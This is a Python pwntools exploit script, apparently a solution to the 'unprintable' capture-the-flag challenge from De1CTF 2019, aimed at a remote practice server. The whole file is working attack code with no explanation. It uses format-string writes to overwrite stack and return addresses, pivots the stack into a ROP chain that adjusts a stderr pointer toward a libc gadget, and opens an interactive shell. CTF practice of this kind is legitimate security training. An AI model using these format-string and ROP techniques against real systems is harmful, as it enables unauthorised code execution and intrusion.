from pwn import *
debug=0
context.log_level='debug'
if debug:
    p=process('./de1ctf_2019_unprintable')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
else:
    p=remote('node3.buuoj.cn',29821)
def ru(x):
    return p.recvuntil(x)
def se(x):
    p.send(x)
def sl(x):
    p.sendline(x)
def wait(x=True):
    #raw_input()
    sleep(0.3)
def write_addr(addr,sz=6):
    t = (stack+0x40)%0x100
    v = p64(addr)
    for i in range(sz):
        if t+i != 0:
            se('%'+str(t+i)+'c%18$hhn%'+str(1955-t-i)+'c%23$hn\x00')
        else:
            se('%18$hhn%1955c%23$hn')
        wait()
        tv = ord(v[i])
        if tv != 0:
            se('%'+str(tv)+'c%13$hhn%'+str(1955-tv)+'c%23$hn\x00')
        else:
            se('%13$hhn%1955c%23$hn')
        wait()
def write_value(addr,value,addr_sz=6):
    write_addr(addr,addr_sz)
    se('%'+str(ord(value[0]))+'c%14$hhn%'+str(1955-ord(value[0]))+'c%23$hn\x00')
    wait()
    ta = p64(addr)[1]
    for i in range(1,len(value)):
        tmp = p64(addr+i)[1]
        if ta!=tmp:
            write_addr(addr+i,2)
            ta = tmp
        else:
            write_addr(addr+i,1)
        if ord(value[i]) !=0:
            se('%'+str(ord(value[i]))+'c%14$hhn%'+str(1955-ord(value[i]))+'c%23$hn\x00')
        else:
            se('%14$hhn%1955c%23$hn\x00')
        wait()
buf = 0x601060+0x100+4
ru('This is your gift: ')
stack = int(ru('\n'),16)-0x118
if stack%0x10000 > 0x2000:
    p.close()
    exit()
ret_addr = stack - 0xe8
se('%'+str(buf-0x600DD8)+'c%26$hn'.ljust(0x100,'\x00')+p64(0x4007A3))
wait()
tmp = (stack+0x40)%0x10000
se('%c'*16+'%'+str(tmp-16)+'c%hn%'+str((163-(tmp%0x100)+0x100)%0x100)+'c%23$hhn\x00')
wait()
# if debug:
#     gdb.attach(p)
# raw_input()
rop = 0x601060+0x200
write_value(stack,p64(rop)[:6])
context.arch = 'amd64'
prbp = 0x400690
prsp = 0x40082d
adc = 0x4006E8
arsp = 0x0400848
prbx = 0x40082A 
call = 0x400810 
stderr = 0x601040 
payload = p64(arsp)*3
payload += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,0,call)
payload += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)
se(('%'+str(0x82d)+'c%23$hn').ljust(0x200,'\0')+payload)
print(hex(stack))
p.interactive()